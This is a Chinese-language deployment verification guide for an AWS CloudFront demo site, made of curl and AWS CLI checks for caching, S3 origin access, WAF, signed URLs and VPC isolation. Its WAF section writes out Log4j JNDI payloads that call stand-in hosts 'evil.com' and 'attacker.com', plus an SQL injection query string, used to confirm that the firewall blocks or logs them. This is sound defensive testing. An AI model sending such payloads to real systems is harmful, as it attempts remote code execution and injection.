# CloudFront 演示平台 — 功能验证指南

> **站点**: https://unice.keithyu.cloud
> **验证时间**: 部署完成后逐项验证
> **适用环境**: Account `434465421667` | Region `ap-northeast-1` (Tokyo)

---

## 快速健康检查

```bash
curl -s https://unice.keithyu.cloud/api/health | python3 -m json.tool
```

**预期输出**:

```json
{
    "status": "ok",
    "timestamp": "2026-04-14T...",
    "traceId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
    "version": "1.0.0",
    "uptime": 12345,
    "env": {
        "nodeEnv": "production",
        "region": "ap-northeast-1",
        "dbConfigured": true,
        "cognitoConfigured": true,
        "dynamoConfigured": true
    }
}
```

如果失败:
- `curl: (6) Could not resolve host` — DNS 未生效，检查 Route53 ALIAS 记录
- `curl: (35) SSL handshake` — ACM 证书未签发或非 us-east-1 区域
- `502 Bad Gateway` — Origin 不可达，检查 EC2/ALB 健康状态

---

## 1. CloudFront -> VPC Origin -> ALB -> EC2 连通性

### 1.1 API Health Check

```bash
curl -s https://unice.keithyu.cloud/api/health | python3 -m json.tool
```

**预期结果**:
- `status` = `"ok"`
- `traceId` 为合法 UUID v4 格式
- `env.dbConfigured` = `true`
- `env.cognitoConfigured` = `true`
- `env.dynamoConfigured` = `true`

**排查方向**:
- `env.dbConfigured: false` — EC2 上 `.env` 中 `DB_HOST` 未配置或 Aurora 集群未就绪
- `env.cognitoConfigured: false` — `COGNITO_USER_POOL_ID` 环境变量缺失
- 返回 502/504 — 检查 ALB Target Group 健康状态和 EC2 安全组入站规则

### 1.2 Debug Headers（CloudFront 注入的地理位置等）

```bash
curl -s https://unice.keithyu.cloud/api/debug | python3 -m json.tool
```

**预期结果** — `cloudfront` 字段应包含:
- `viewerCountry`: 如 `"JP"`, `"CN"`, `"US"` 等（取决于请求发起地）
- `viewerCity`: 如 `"Tokyo"`, `"Beijing"` 等
- `isDesktop`: `"true"` 或 `"false"`
- `isMobile`: `"true"` 或 `"false"`
- `forwardedFor`: 包含客户端真实 IP

**排查方向**:
- `cloudfront` 全部为 `null` — Origin Request Policy 未正确配置 CloudFront 地理 header 白名单
- 仅部分为 `null` — 检查 `AllViewerExceptHostHeader` 策略中的 `headers.items` 列表

### 1.3 Delay Test（Origin Timeout 验证）

```bash
# 2 秒延迟测试
curl -s https://unice.keithyu.cloud/api/delay/2000 | python3 -m json.tool
```

**预期结果**:
- `requested` = `2000`
- `actual` 约 `2000`（允许 +/- 50ms 波动）
- `capped` = `2000`

```bash
# 边界测试：超过 30 秒上限
curl -s https://unice.keithyu.cloud/api/delay/60000 | python3 -m json.tool
```

**预期结果**:
- `requested` = `60000`
- `capped` = `30000`（服务端限制最大 30 秒）

**排查方向**:
- 请求超时无响应 — CloudFront Origin Read Timeout（默认 60s）或 ALB Idle Timeout 过短

---

## 2. S3 OAC 静态资源

### 2.1 CSS 文件

**通过 CloudFront 访问（应返回 200）**:

```bash
curl -sI https://unice.keithyu.cloud/static/css/style.css | grep -iE "HTTP/|content-type|x-cache"
```

**预期输出**:
```
HTTP/2 200
content-type: text/css
x-cache: Miss from cloudfront    # 首次请求
```

**直接访问 S3 URL（应返回 403，OAC 保护）**:

```bash
# 替换 BUCKET 为实际桶名 (如 unice-demo-static-xxx)
curl -sI "https://unice-demo-static.s3.ap-northeast-1.amazonaws.com/static/css/style.css" | head -3
```

**预期输出**:
```
HTTP/1.1 403 Forbidden
```

**排查方向**:
- CloudFront 返回 403 — S3 Bucket Policy 未授权 OAC，检查 `aws:SourceArn` 条件
- CloudFront 返回 404 — 静态资源未上传到 S3，运行 `scripts/deploy-static.sh`

### 2.2 商品图片

```bash
curl -sI https://unice.keithyu.cloud/images/products/sample.jpg | grep -iE "HTTP/|content-type|x-cache"
```

**预期输出**:
```
HTTP/2 200
content-type: image/jpeg
x-cache: Miss from cloudfront
```

**排查方向**:
- 404 — 图片未上传到 S3 的 `images/` 前缀下

### 2.3 自定义错误页面

**访问不存在的路径（触发 404 自定义错误页面）**:

```bash
curl -s https://unice.keithyu.cloud/this-path-does-not-exist-at-all | head -10
```

**预期输出**: 品牌化 HTML 页面内容，包含类似 "Page Not Found" 或 "404" 的友好提示，而非 JSON 错误。

```bash
# 验证错误页面 HTML 源自 S3
curl -sI https://unice.keithyu.cloud/this-path-does-not-exist-at-all | grep -iE "HTTP/|content-type"
```

**预期**:
```
HTTP/2 404
content-type: text/html
```

**排查方向**:
- 返回 JSON 而非 HTML — CloudFront Custom Error Response 未配置，或 S3 上 `/static/errors/404.html` 不存在
- 返回默认 CloudFront 错误页 — 检查 `custom_error_response` 的 `response_page_path`

---

## 3. CloudFront 缓存策略

### 3.1 ProductCache（3600s TTL）

**首次请求（预期 Miss）**:

```bash
curl -sI https://unice.keithyu.cloud/api/products?page=1 | grep -iE "x-cache|age"
```

**预期**: `x-cache: Miss from cloudfront`

**二次请求（预期 Hit）**:

```bash
curl -sI https://unice.keithyu.cloud/api/products?page=1 | grep -iE "x-cache|age"
```

**预期**: `x-cache: Hit from cloudfront`，且 `age` 字段 > 0

**不同 Query String（独立缓存键）**:

```bash
curl -sI https://unice.keithyu.cloud/api/products?page=2 | grep -iE "x-cache"
```

**预期**: `x-cache: Miss from cloudfront`（page=2 是新的缓存键，与 page=1 独立）

**排查方向**:
- 始终 Miss — Cache Policy 的 `query_string_behavior` 设为 `none`（应为 `all`）
- 始终 Miss — 源站响应包含 `Cache-Control: no-cache` 或 `no-store`

### 3.2 CachingDisabled（/api/debug）

```bash
# 第一次请求
curl -sI https://unice.keithyu.cloud/api/debug | grep -iE "x-cache"

# 第二次请求
curl -sI https://unice.keithyu.cloud/api/debug | grep -iE "x-cache"
```

**预期**: 两次均为 `x-cache: Miss from cloudfront`

**排查方向**:
- 出现 Hit — `/api/debug*` Behavior 绑定了错误的 Cache Policy（应为 CachingDisabled）

### 3.3 Static Cache（24h CachingOptimized）

```bash
# 首次访问 CSS
curl -sI https://unice.keithyu.cloud/static/css/style.css | grep -iE "x-cache|age|cache-control"

# 二次访问 CSS
curl -sI https://unice.keithyu.cloud/static/css/style.css | grep -iE "x-cache|age|cache-control"
```

**预期**: 二次请求 `x-cache: Hit from cloudfront`

**排查方向**:
- 始终 Miss — S3 对象缺少 `Cache-Control` metadata，重新上传时指定 `--cache-control "public, max-age=3600"`

---

## 4. SSR 页面渲染（EJS）

### 4.1 首页

```bash
curl -s https://unice.keithyu.cloud/ | grep -iE "<title>|product-card|nav"
```

**预期**: 输出包含 `<title>` 标签（含 "首页" 或 "Unice"）、导航栏 HTML、商品卡片元素。

**排查方向**:
- 返回空白或 502 — Express 应用未启动，通过 SSM 检查 `pm2 status`
- 无商品卡片 — 数据库未 seed，运行 `node seed.js`

### 4.2 商品列表页

```bash
curl -s https://unice.keithyu.cloud/products | grep -c "product"
```

**预期**: 输出数值 >= 1（页面中包含商品相关元素）。

```bash
# 检查分页功能
curl -s https://unice.keithyu.cloud/products?page=2 | grep -c "product"
```

### 4.3 商品详情页

```bash
curl -s https://unice.keithyu.cloud/products/1 | grep -iE "<title>|price|add.*cart"
```

**预期**: 包含商品名称的 `<title>` 标签、价格信息、加入购物车按钮。

### 4.4 购物车页

```bash
curl -s https://unice.keithyu.cloud/cart | grep -iE "<title>|cart"
```

**预期**: 包含 "购物车" 或 "Cart" 的页面标题。

### 4.5 登录页

```bash
curl -s https://unice.keithyu.cloud/login | grep -iE "<title>|login|password"
```

**预期**: 包含登录表单元素（用户名/密码输入框）。

### 4.6 调试页（headers 表格）

```bash
curl -s https://unice.keithyu.cloud/debug | grep -iE "x-trace-id|cloudfront-viewer-country|headers"
```

**预期**: 页面渲染 headers 表格，可见 CloudFront 注入的各类 header。

**排查方向（通用）**:
- 所有 SSR 页面返回 500 — EJS 模板渲染错误，检查 `pm2 logs`
- 404 JSON 而非 HTML — Express 路由未注册，检查 `server.js` 路由挂载

---

## 5. UUID 追踪（x-trace-id）

**首次请求（生成新 UUID）**:

```bash
curl -sI https://unice.keithyu.cloud/api/health | grep -iE "x-trace-id|set-cookie"
```

**预期**:
- `X-Trace-Id: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`（UUID v4 格式）
- `Set-Cookie: x-trace-id=xxxxxxxx-...; Path=/; HttpOnly; Secure; SameSite=Lax`

**带 Cookie 请求（保持同一 UUID）**:

```bash
# 获取 trace ID
TRACE_ID=$(curl -sI https://unice.keithyu.cloud/api/health | grep -i "x-trace-id" | awk '{print $2}' | tr -d '\r')
echo "Trace ID: $TRACE_ID"

# 带 cookie 再次请求
curl -sI -b "x-trace-id=$TRACE_ID" https://unice.keithyu.cloud/api/health | grep -iE "x-trace-id|set-cookie"
```

**预期**:
- `X-Trace-Id` 值与第一次请求相同
- 不再出现 `Set-Cookie`（已有 cookie，无需重新设置）

**排查方向**:
- 每次请求都生成新 UUID — Cookie 未正确传递，检查 CloudFront Cache Policy 的 cookie 白名单是否包含 `x-trace-id`
- `X-Trace-Id` header 缺失 — `uuid-tracker` 中间件未加载，检查 `server.js` 中间件注册顺序

---

## 6. WAF 安全防护

### 6.1 Log4j 拦截（Known Bad Inputs — Block 模式）

```bash
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
  -H 'User-Agent: ${jndi:ldap://evil.com/a}' \
  https://unice.keithyu.cloud/
```

**预期**: `HTTP Status: 403`

```bash
# 另一种 Log4j payload 变体
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
  -H 'X-Forwarded-For: ${jndi:ldap://attacker.com/exploit}' \
  https://unice.keithyu.cloud/api/health
```

**预期**: `HTTP Status: 403`

**排查方向**:
- 返回 200 — WAF Web ACL 未关联到 CloudFront Distribution，或 `AWSManagedRulesKnownBadInputsRuleSet` 被设为 Count 模式

### 6.2 SQL 注入检测（Common Rule Set — Count 模式）

```bash
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
  "https://unice.keithyu.cloud/api/products?id=1%27%20OR%201%3D1"
```

**预期**: `HTTP Status: 200`（Count 模式不拦截，仅记录）

WAF 日志中可通过 CloudWatch Metrics 确认检测到 SQL 注入:
```bash
aws cloudwatch get-metric-statistics \
  --namespace "AWS/WAFV2" \
  --metric-name "CountedRequests" \
  --dimensions Name=WebACL,Value=unice-demo-waf Name=Rule,Value=AWS-AWSManagedRulesCommonRuleSet Name=Region,Value=us-east-1 \
  --start-time $(date -u -d '10 minutes ago' +%Y-%m-%dT%H:%M:%S) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%S) \
  --period 300 --statistics Sum \
  --profile default --region us-east-1
```

**排查方向**:
- 返回 403 — Common Rule Set 被切换为 Block 模式（`override_action { none {} }`）

### 6.3 速率限制（2000 次/5 分钟）

```bash
# 说明: 同一 IP 在 5 分钟内超过 2000 次请求将被封禁
# 测试需发送大量请求，不建议在生产验证中执行
# 可通过 CloudWatch Metrics 监控 RateLimitRule 触发次数

# 验证速率限制规则已部署
aws wafv2 get-web-acl \
  --name unice-demo-waf --scope CLOUDFRONT --id $(aws wafv2 list-web-acls --scope CLOUDFRONT --profile default --region us-east-1 --query "WebACLs[?Name=='unice-demo-waf'].Id" --output text) \
  --profile default --region us-east-1 \
  --query "WebACL.Rules[?Name=='RateLimitRule'].{Name:Name,Priority:Priority,Action:Action}" --output table
```

**预期**: 规则存在，Priority=4，Action=Block。

### 6.4 Bot Control（Count 模式）

```bash
# curl 使用默认 User-Agent（被识别为 HTTP Library）
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
  https://unice.keithyu.cloud/api/health
```

**预期**: `HTTP Status: 200`（Bot Control 整体为 Count 模式，且 `CategoryHttpLibrary` 和 `SignalNonBrowserUserAgent` 额外设为 Count，不阻断 curl/API 客户端）。

**排查方向**:
- curl 返回 403 — Bot Control 被切换为 Block 模式，或 `CategoryHttpLibrary` 的 `rule_action_override` 丢失
- 未启用 Bot Control — 检查 `enable_bot_control` 变量（默认可能为 false，需额外费用 $10/月）

---

## 7. 签名 URL 保护

### 7.1 无签名访问 /premium/*（应返回 403）

```bash
curl -sI https://unice.keithyu.cloud/premium/sample.html | grep -iE "HTTP/"
```

**预期**: `HTTP/2 403`

```bash
# 查看 403 自定义错误页面内容
curl -s https://unice.keithyu.cloud/premium/sample.html | head -5
```

**预期**: 品牌化 403 HTML 页面（来自 `/static/errors/403.html`）。

**排查方向**:
- 返回 200 — `enable_signed_url` 变量为 `false`，Trusted Key Group 未绑定
- 返回 404 — S3 中 `/premium/` 前缀下无文件，先上传测试文件:

```bash
BUCKET=$(cd /root/keith-space/2026-project/longqi-cloudfront/terraform && terraform output -raw s3_bucket_id)
echo "<h1>Premium Content</h1>" | aws s3 cp - s3://$BUCKET/premium/sample.html \
  --content-type "text/html" --profile default --region ap-northeast-1
```

### 7.2 有签名访问

签名 URL 需要使用 Terraform 生成的私钥签发。完整步骤参考 `hands-on/06-cloudfront-signed-url.md`。

**生成签名 URL 的简要流程**:

```bash
# 1. 确认私钥文件已生成
ls -la /root/keith-space/2026-project/longqi-cloudfront/terraform/keys/cf-private-key.pem

# 2. 获取 Key Pair ID
KEY_PAIR_ID=$(cd /root/keith-space/2026-project/longqi-cloudfront/terraform && \
  terraform output -raw cloudfront_public_key_id 2>/dev/null)
echo "Key Pair ID: $KEY_PAIR_ID"

# 3. 使用 AWS CLI 签名（需 aws cloudfront sign 命令或自行编写签名脚本）
# 详细步骤参考: hands-on/06-cloudfront-signed-url.md
```

---

## 8. VPC Origin 安全隔离

**直接访问 Internal ALB DNS（应超时/不可达）**:

```bash
# 获取 ALB DNS
ALB_DNS=$(cd /root/keith-space/2026-project/longqi-cloudfront/terraform && terraform output -raw alb_dns_name)
echo "ALB DNS: $ALB_DNS"

# 尝试直连（5 秒超时）
curl --connect-timeout 5 http://$ALB_DNS/api/health 2>&1 || echo "--- 无法直连 Internal ALB，VPC Origin 安全隔离生效 ---"
```

**预期**: 连接超时或 DNS 解析失败（Internal ALB 无公网 IP，无法从 VPC 外部访问）。

**通过 CloudFront 访问（正常）**:

```bash
curl -s https://unice.keithyu.cloud/api/health | python3 -m json.tool
```

**预期**: 正常返回 `{"status": "ok", ...}`

**排查方向**:
- Internal ALB 可从外部访问 — ALB 创建时 `internal` 参数未设为 `true`，或安全组放行了 0.0.0.0/0

---

## 9. Continuous Deployment（灰度发布）

### 9.1 确认 Staging Distribution 已部署

```bash
cd /root/keith-space/2026-project/longqi-cloudfront/terraform

# 查看 Staging Distribution ID
terraform output -raw staging_distribution_id 2>/dev/null || echo "Staging Distribution 未创建（enable_continuous_deployment = false）"

# 查看 CD Policy ID
terraform output -raw cd_policy_id 2>/dev/null || echo "CD Policy 未创建"
```

### 9.2 通过 Header 测试 Staging（SingleHeader 模式）

如果 CD Policy 配置为 `SingleHeader` 模式:

```bash
# 不带 header — 路由到 Production
curl -sI https://unice.keithyu.cloud/api/health | grep -iE "x-cache|x-amz-cf-pop"

# 带 staging header — 路由到 Staging Distribution
curl -sI -H "aws-cf-cd-staging: true" https://unice.keithyu.cloud/api/health | grep -iE "x-cache|x-amz-cf-pop"
```

**预期**: 两次请求可能返回不同的 `x-amz-cf-pop` 或缓存行为差异。

### 9.3 通过权重测试 Staging（SingleWeight 模式）

如果 CD Policy 配置为 `SingleWeight` 模式，一定百分比的流量会自动路由到 Staging。多次请求可观察到不同 Distribution 的响应:

```bash
for i in $(seq 1 10); do
  echo "Request $i: $(curl -sI https://unice.keithyu.cloud/api/health 2>/dev/null | grep -i x-amz-cf-id | head -1)"
done
```

**排查方向**:
- Staging 未生效 — CD Policy 的 `enabled` 为 false
- Staging 返回 5xx — Staging Distribution 的源站配置与 Production 不一致

---

## 10. Tag-Based Invalidation

### 10.1 确认 DynamoDB 表已创建

```bash
aws dynamodb describe-table \
  --table-name unice-cache-tags \
  --profile default --region ap-northeast-1 \
  --query "Table.{Name:TableName,Status:TableStatus,ItemCount:ItemCount}" --output table
```

**预期**: Status = `ACTIVE`

### 10.2 确认 Lambda@Edge 已部署

```bash
# Origin Response Lambda (us-east-1)
aws lambda get-function \
  --function-name unice-demo-cache-tag-origin-response \
  --profile default --region us-east-1 \
  --query "Configuration.{Name:FunctionName,Runtime:Runtime,State:State}" --output table

# Invalidation Trigger Lambda (ap-northeast-1)
aws lambda get-function \
  --function-name unice-demo-cache-tag-invalidation \
  --profile default --region ap-northeast-1 \
  --query "Configuration.{Name:FunctionName,Runtime:Runtime,State:State}" --output table
```

**预期**: 两个 Lambda 均为 `State: Active`，Runtime = `nodejs20.x`

### 10.3 触发 Tag Invalidation

Tag-Based Invalidation 的完整验证需要:
1. 源站 API 在响应中设置 `Cache-Tag` header（如 `Cache-Tag: product-1, category-hair`）
2. Lambda@Edge 在 Origin Response 阶段捕获 tag 并写入 DynamoDB
3. 通过管理 API 触发失效

```bash
# 查看 DynamoDB 中已收集的 tag 记录（需认证）
# 管理 API 需 Cognito JWT，完整步骤参考:
# hands-on/12-cloudfront-tag-based-invalidation.md
```

**排查方向**:
- DynamoDB 表为空 — Lambda@Edge 未关联到 Distribution 的 Origin Response 事件
- Lambda@Edge 执行错误 — 检查 us-east-1 区域的 CloudWatch Logs

---

## 11. CloudFront Functions

### 11.1 URL 重写（默认 pass-through 模式）

当 `default_cf_function = "url-rewrite"` 时:

```bash
# 验证 URL 重写 function 已部署
aws cloudfront list-functions \
  --profile default \
  --query "FunctionList.Items[?contains(Name,'url-rewrite')].{Name:Name,Status:Status,Stage:FunctionMetadata.Stage}" --output table
```

**预期**: Function 状态为 `UNASSOCIATED` 或已关联到 Distribution。

### 11.2 A/B 测试（切换 Function 后验证）

将 `default_cf_function` 变量改为 `"ab-test"` 并 `terraform apply` 后:

```bash
# 多次请求观察 A/B 分组
for i in $(seq 1 5); do
  curl -sI https://unice.keithyu.cloud/ 2>/dev/null | grep -i "x-ab-group" || echo "Request $i: no x-ab-group header"
done
```

**预期**: 请求被随机分配到 A 或 B 组，通过 `x-ab-group` header 或 cookie 传递。

### 11.3 地理重定向（切换 Function 后验证）

将 `default_cf_function` 变量改为 `"geo-redirect"` 并 `terraform apply` 后:

```bash
curl -sI https://unice.keithyu.cloud/ | grep -iE "HTTP/|location"
```

**预期**: 来自中国 IP 的请求收到 `302` 重定向到 `/cn/` 前缀路径。

### 11.4 查看所有已部署的 CloudFront Functions

```bash
aws cloudfront list-functions \
  --profile default \
  --query "FunctionList.Items[].{Name:Name,Stage:FunctionMetadata.Stage,Comment:FunctionConfig.Comment}" --output table
```

**排查方向**:
- Function 未生效 — 检查 `publish = true` 且 Function 已关联到正确的 Behavior
- 每个 Behavior 的每个事件类型只允许关联 1 个 CloudFront Function

---

## 12. 地理限制

### 12.1 确认地理限制配置

```bash
cd /root/keith-space/2026-project/longqi-cloudfront/terraform

DIST_ID=$(terraform output -raw cloudfront_distribution_id)
aws cloudfront get-distribution-config --id $DIST_ID --profile default \
  --query "DistributionConfig.Restrictions.GeoRestriction" --output json
```

**预期**（默认黑名单模式）:
```json
{
    "RestrictionType": "blacklist",
    "Quantity": 2,
    "Items": ["IR", "KP"]
}
```

### 12.2 查看 CloudFront-Viewer-Country Header

```bash
curl -s https://unice.keithyu.cloud/api/debug | python3 -c "
import json, sys
data = json.load(sys.stdin)
print('Viewer Country:', data.get('cloudfront', {}).get('viewerCountry', 'N/A'))
print('Viewer City:', data.get('cloudfront', {}).get('viewerCity', 'N/A'))
"
```

**预期**: 显示请求来源的国家代码和城市名称。

**排查方向**:
- 地理限制未生效 — `enable_geo_restriction` 变量为 `false`
- WAF 的 `GeoBlockRule` 与 CloudFront 的 `geo_restriction` 是两层独立的地理限制，可同时启用

---

## 浏览器验证清单

用 Chrome 访问以下页面，检查视觉效果和交互功能:

- [ ] **首页** https://unice.keithyu.cloud/ — hero 区域 + 推荐商品网格（最多 8 个）
- [ ] **商品列表** https://unice.keithyu.cloud/products — 商品卡片 + 分类筛选 + 分页导航
- [ ] **商品详情** https://unice.keithyu.cloud/products/1 — 商品图片 + 价格 + 加入购物车按钮
- [ ] **购物车** https://unice.keithyu.cloud/cart — 购物车页面渲染正常
- [ ] **登录/注册** https://unice.keithyu.cloud/login — 登录表单 + Cognito 集成
- [ ] **调试页** https://unice.keithyu.cloud/debug — headers 表格高亮显示 CloudFront 注入的 header
- [ ] **404 错误页** https://unice.keithyu.cloud/nonexistent — 品牌化错误页面（非默认白页）

### 浏览器 DevTools 检查项

打开 Chrome DevTools (F12) > Network 标签:

- [ ] 响应 header 中包含 `X-Trace-Id`（UUID 格式）
- [ ] `x-cache` 值在首次请求为 `Miss`，刷新后变为 `Hit`（缓存生效）
- [ ] `x-amz-cf-pop` 显示最近的 CloudFront 边缘节点 POP 代码
- [ ] CSS/JS 资源通过 `/static/` 路径加载（来自 S3 OAC）
- [ ] Application > Cookies 中可见 `x-trace-id` cookie（HttpOnly）

---

## 验证状态总结

| # | 功能 | 验证命令 | 预期 | 实际 |
|---|------|---------|------|------|
| 1.1 | Health Check | `curl /api/health` | status: ok | |
| 1.2 | Debug Headers | `curl /api/debug` | cloudfront 字段有值 | |
| 1.3 | Delay Test | `curl /api/delay/2000` | actual ~2000ms | |
| 2.1 | S3 OAC CSS | `curl /static/css/style.css` | 200 via CF, 403 direct | |
| 2.3 | Error Pages | `curl /nonexistent` | 品牌化 404 HTML | |
| 3.1 | ProductCache | 两次 `curl /api/products` | Miss -> Hit | |
| 3.2 | CachingDisabled | 两次 `curl /api/debug` | 均 Miss | |
| 4.1 | SSR 首页 | `curl /` | EJS 渲染 HTML | |
| 5 | UUID 追踪 | 带/不带 cookie 请求 | UUID 一致 | |
| 6.1 | WAF Log4j | jndi payload | 403 | |
| 6.2 | WAF SQLi | SQL 注入 QS | 200 (Count) | |
| 7.1 | Signed URL | 无签名 `/premium/*` | 403 | |
| 8 | VPC Origin | 直连 ALB | 超时 | |
